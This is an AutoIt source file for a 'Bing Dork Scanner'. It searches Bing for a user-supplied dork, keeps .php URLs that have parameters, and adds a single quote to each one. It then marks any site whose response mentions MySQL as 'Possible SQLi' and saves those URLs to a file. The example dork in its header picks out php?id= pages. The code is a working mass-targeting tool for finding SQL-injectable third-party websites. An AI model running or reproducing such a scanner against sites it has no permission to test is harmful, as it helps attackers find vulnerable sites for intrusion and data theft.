#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Outfile=BDScan_test.exe
#AutoIt3Wrapper_Change2CUI=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****


#include <Inet.au3>
#include <Array.au3>
#include <String.au3>
#include <MsgBoxConstants.au3>
#include <File.au3>


Global Const $FOREGROUND_Black = 0x0000
Global Const $FOREGROUND_Blue = 0x0001
Global Const $FOREGROUND_Green = 0x0002
Global Const $FOREGROUND_Cyan = 0x0003
Global Const $FOREGROUND_Red = 0x0004
Global Const $FOREGROUND_Magenta = 0x0005
Global Const $FOREGROUND_Yellow = 0x0006
Global Const $FOREGROUND_Grey = 0x0007
Global Const $FOREGROUND_White = 0x0008

Global Const $BACKGROUND_Black = 0x0000
Global Const $BACKGROUND_Blue = 0x0010
Global Const $BACKGROUND_Green = 0x0020
Global Const $BACKGROUND_Cyan = 0x0030
Global Const $BACKGROUND_Red = 0x0040
Global Const $BACKGROUND_Magenta = 0x0050
Global Const $BACKGROUND_Yellow = 0x0060
Global Const $BACKGROUND_Grey = 0x0070
Global Const $BACKGROUND_White = 0x0080
Global $hdllKernel32 = DllOpen("kernel32.dll")

_get_dork_urls($CmdLine[1], $CmdLine[2]) ;($CmdLine[1],$CmdLine[2])





; #FUNCTION# ====================================================================================================================
; Name ..........: _SetConsoleColor
; Description ...:
; Syntax ........: _SetConsoleColor($iColor)
; Parameters ....: $iColor              - an integer value.
; Return values .: None
; Author ........: Bustd86
; Example .......: _SetConsoleColor($FOREGROUND_Yellow)
; ===============================================================================================================================
Func _SetConsoleColor($iColor)
	Local $aRet, $aRet2
	$aRet = DllCall($hdllKernel32, "hwnd", "GetStdHandle", "int", -11) ;$STD_INPUT_HANDLE = -10,$STD_OUTPUT_HANDLE = -11,$STD_ERROR_HANDLE = -12
	If Not UBound($aRet) > 0 Then
		ConsoleWrite("!>Error.  GetStdHandle failed." & @LF)
		Return 0
	EndIf
	$aRet2 = DllCall($hdllKernel32, "int", "SetConsoleTextAttribute", "hwnd", $aRet[0], "ushort", $iColor)
	If Not UBound($aRet2) > 0 Then
		ConsoleWrite("!>Error.  SetConsoleTextAttribute failed." & @LF)
		Return 0
	EndIf

	If $aRet2 <> 0 Then
		Return 1
	Else
		Return 0
	EndIf
EndFunc   ;==>_SetConsoleColor



; #FUNCTION# ====================================================================================================================
; Name ..........: _get_dork_urls
; Description ...: Bing Dork suche mit seitenangabe für dauer der suche
; Syntax ........: _get_dork_urls($inputParam, $inputPages)
; Parameters ....: $inputParam          - DORK
;                  $inputPages          - Anzahl Pages
; Return values .: None
; Author ........: Bustd86
; Modified ......:
; Remarks .......:
; Related .......:
; Link ..........:
; Example .......: > BDScan.exe instreamset:url:"php?id="+AND+instreamset:title:nudes+girls 25
; ===============================================================================================================================
Func _get_dork_urls($inputParam, $inputPages)

	$search_string = $inputParam
	$pages = $inputPages
	$sFilePath = @ScriptDir & "\dorks_found.txt"
	$sFilePath2 = @ScriptDir & "\dorks_found_sqli.txt"


	ConsoleWrite("----------------------------------------" & @CRLF & @CRLF)
	_SetConsoleColor($FOREGROUND_Magenta)
	ConsoleWrite(@TAB & "Bustd86 Bing Dork Scanner" & @CRLF & @CRLF)
	_SetConsoleColor($FOREGROUND_White)
	ConsoleWrite("----------------------------------------" & @CRLF & @CRLF)
	_SetConsoleColor($FOREGROUND_Red)
	ConsoleWrite('    [!]')
	_SetConsoleColor($FOREGROUND_White)
	ConsoleWrite(@TAB & " Suche nach Dork: " & $search_string & @CRLF)
	_SetConsoleColor($FOREGROUND_Red)
	ConsoleWrite('    [!]')
	_SetConsoleColor($FOREGROUND_White)
	ConsoleWrite(@TAB & " Durchsuche " & $pages & " Seiten auf Bing" & @CRLF & @CRLF)
	ConsoleWrite("----------------------------------------" & @CRLF & @CRLF)

	Local $aArrayTarget[0]
	Local $aArraySource[0]
	Local $aUrl_with_params[0]


	For $i = 1 To $pages

		_SetConsoleColor($FOREGROUND_Yellow)
		ConsoleWrite("    [+] ")
		_SetConsoleColor($FOREGROUND_White)
		ConsoleWrite(" Durchsuche Seite " & $i & " von " & $pages & @CRLF)

		$search_url = "https://www.bing.com/search?q=" & $search_string & "&first=" & $i * 10
		$aArraySource = _StringBetween(_INetGetSource($search_url), '<h2><a href="', '" h="')
		_ArrayConcatenate($aArrayTarget, $aArraySource)
		$aArrayUnique = _ArrayUnique($aArrayTarget)
		$found = UBound($aArrayUnique) - 1


		_SetConsoleColor($FOREGROUND_Red)
		ConsoleWrite("    [!]  ")
		_SetConsoleColor($FOREGROUND_White)
		ConsoleWrite($found & "  Seiten gefunden..." & @CRLF & @CRLF)

		Sleep(500)
	Next
	_SetConsoleColor($FOREGROUND_White)
	ConsoleWrite(@CR & @CRLF & "----------------------------------------" & @CRLF & @CRLF)
	_SetConsoleColor($FOREGROUND_Red)
	ConsoleWrite(@CR & @CRLF & "     Getting Unique URLs with Params" & @CRLF & @CRLF)
	_SetConsoleColor($FOREGROUND_White)

	For $z = 1 To UBound($aArrayUnique) - 1
		$aMatch_param = StringRegExp(_URIDecode($aArrayUnique[$z]), "[[:<:]]http://[.0-9A-Za-z-]+\.[A-Za-z]{2,63}+(?:/[]!""#$%&'()*+,.0-9:;<=>?@A-Z[\\_`a-z{|}~^-]+){0,9}/[.0-9A-Z_a-z-]+\.php(?:\?[]!""#$%&'()*+,./0-9:;<=>?@A-Z[\\_`a-z{|}~^-]*)?", $STR_REGEXPMATCH)

		If $aMatch_param == 1 Then
			_ArrayAdd($aUrl_with_params, StringReplace($aArrayUnique[$z], "&amp;", "&"))
		EndIf

	Next
		;For $x = 1 To UBound($aUrl_with_params) - 1
		;	$aSplitURL=StringSplit($aUrl_with_params[$x],'/',2)

		;Next



	ConsoleWrite(@CRLF & "-----------------Results----------------" & @CRLF & @CRLF)
	For $y = 0 To UBound($aUrl_with_params) - 1
		$myurl = $aUrl_with_params[$y] & "%27"
		$e=is_mysql_error($myurl)
		If $e Then
			_SetConsoleColor($FOREGROUND_Blue)
			ConsoleWrite("[" & $y + 1 & "]" & @TAB & $aUrl_with_params[$y] & @CRLF)
			_SetConsoleColor($FOREGROUND_Red)
			ConsoleWrite("[!]"& @TAB & "Possible SQLi:" & @TAB & $aUrl_with_params[$y] & @CRLF)
			FileWriteLine($sFilePath2,$aUrl_with_params[$y])
		Else
		_SetConsoleColor($FOREGROUND_Blue)
		ConsoleWrite("[" & $y + 1 & "]" & @TAB & $aUrl_with_params[$y] & @CRLF)
		EndIf

		Sleep(150)
	Next
	_SetConsoleColor($FOREGROUND_White)
	ConsoleWrite(@CRLF & "----------------------------------------" & @CRLF & @CRLF & "Ergebnise gespeichert nach: " & $sFilePath & @CRLF)


	_FileWriteFromArray($sFilePath, $aArrayUnique, 0)

EndFunc   ;==>_get_dork_urls



; #FUNCTION# ====================================================================================================================
; Name ..........: _URIEncode
; Description ...:
; Syntax ........: _URIEncode($sData)
; Parameters ....: $sData               - a string value.
; Return values .: URI Encoded
; Author ........: Bustd86
; Modified ......:
; Remarks .......:
; Related .......:
; Link ..........:
; Example .......: _URIEncode($sURL)
; ===============================================================================================================================
Func _URIEncode($sData)
	; Prog@ndy
	Local $aData = StringSplit(BinaryToString(StringToBinary($sData, 4), 1), "")
	Local $nChar
	$sData = ""
	For $i = 1 To $aData[0]
		; ConsoleWrite($aData[$i] & @CRLF)
		$nChar = Asc($aData[$i])
		Switch $nChar
			Case 45, 46, 48 To 57, 65 To 90, 95, 97 To 122, 126
				$sData &= $aData[$i]
			Case 32
				$sData &= "+"
			Case Else
				$sData &= "%" & Hex($nChar, 2)
		EndSwitch
	Next
	Return $sData
EndFunc   ;==>_URIEncode


; #FUNCTION# ====================================================================================================================
; Name ..........: _URIDecode
; Description ...:
; Syntax ........: _URIDecode($sData)
; Parameters ....: $sData               - a string value.
; Return values .: URI Decoded
; Author ........: Bustd86
; Modified ......:
; Remarks .......:
; Related .......:
; Link ..........:
; Example .......: _URIDecode($sURL)
; ===============================================================================================================================
Func _URIDecode($sData)
	; Prog@ndy
	Local $aData = StringSplit(StringReplace($sData, "+", " ", 0, 1), "%")
	$sData = ""
	For $i = 2 To $aData[0]
		$aData[1] &= Chr(Dec(StringLeft($aData[$i], 2))) & StringTrimLeft($aData[$i], 2)
	Next
	Return BinaryToString(StringToBinary($aData[1], 1), 4)
EndFunc   ;==>_URIDecode


Func check_sqli_error()

EndFunc

Func is_mysql_error($URL)

	$sString = _INetGetSource($URL)
	$isAtPos = StringInStr($sString, "MySQL")
	;ConsoleWrite($isAtPos & @CRLF & $URL)
	If $isAtPos Then
		Return(True)
	Else
		Return(False)
	EndIf
EndFunc
